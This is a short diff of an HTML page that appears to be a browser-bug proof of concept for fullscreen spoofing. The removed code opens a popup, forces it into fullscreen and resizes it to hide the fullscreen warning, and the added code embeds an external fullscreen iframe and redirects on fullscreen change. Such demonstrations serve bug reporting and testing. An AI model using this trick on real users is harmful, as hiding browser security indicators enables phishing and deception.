@@ -1,16 +1,7 @@
+<iframe src="https://sourc7.appspot.com/html5/api/fullscreen.html" allowfullscreen="yes"></iframe>
 
 <script>
-function spoof(popupWindow) {
-        popupWindow.resizeBy(5000,500) // Try to increase X offset value if fullscreen notification still appear
-        popupWindow.document.write("Try press \"esc\" multiple times. The browser will stay persist in the fullscreen mode.")
-}
-
-function launch() {
-    var popupWindow = window.open("", "", "width=500;height=500")
-    popupWindow.document.body.innerText = "Click anywhere on the page"
-    popupWindow.document.onclick = function () { popupWindow.document.documentElement.requestFullscreen();  }
-    popupWindow.document.onfullscreenchange = function() { spoof(popupWindow); }
-}
+document.onfullscreenchange = function () {
+  location.href = "https://www.google.com"
+};
 </script>
-
-<button onclick="launch()">Launch</button>
